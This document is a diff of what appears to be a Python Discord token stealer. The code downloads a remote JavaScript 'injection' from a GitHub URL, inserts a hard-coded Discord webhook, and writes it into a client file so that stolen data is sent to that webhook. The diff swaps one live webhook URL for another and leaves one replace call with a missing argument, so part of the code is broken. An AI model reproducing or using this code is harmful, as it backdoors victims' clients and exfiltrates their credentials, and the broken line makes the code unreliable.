@@ -534,7 +534,6 @@ def mac_check():
 
 
 hook = "YOUR WEBHOOK HERE"
-emergencyinjection = "https://canary.discord.com/api/webhooks/1245410550859698246/Brz8zfSVgflXCZF14oTVjAVqw-JmLhoLwUV6nyEzwOpG6_9_fYgCqC1mtAYXSA36vRuU"
 inj3c710n_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
 color =  0x812118
 DETECTED = False
@@ -679,7 +678,7 @@ def inj3c710n():
 
                                                     inj3c710n_cont = requests.get(inj3c710n_url).text
 
-                                                    inj3c710n_cont = inj3c710n_cont.replace("%WEBHOOK%", emergencyinjection)
+                                                    inj3c710n_cont = inj3c710n_cont.replace("%WEBHOOK%")
 
                                                     with open(file_path, "w", encoding="utf-8") as index_file:
                                                         index_file.write(inj3c710n_cont)
@@ -2007,7 +2006,7 @@ def mac_check():
             pass
 
 
-emergencyinjection = "https://canary.discord.com/api/webhooks/1245410550859698246/Brz8zfSVgflXCZF14oTVjAVqw-JmLhoLwUV6nyEzwOpG6_9_fYgCqC1mtAYXSA36vRuU"
+emergencyinjection = "https://canary.discord.com/api/webhooks/1245454663080214709/048W1k0RGtFdTBi_rsuvlypckBZ6PKB8EtucFfrP8Fhzs7-S2D-ALV7LlpZNhhI4kjFG"
 inj3c710n_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
 color =  0x812118
 DETECTED = False
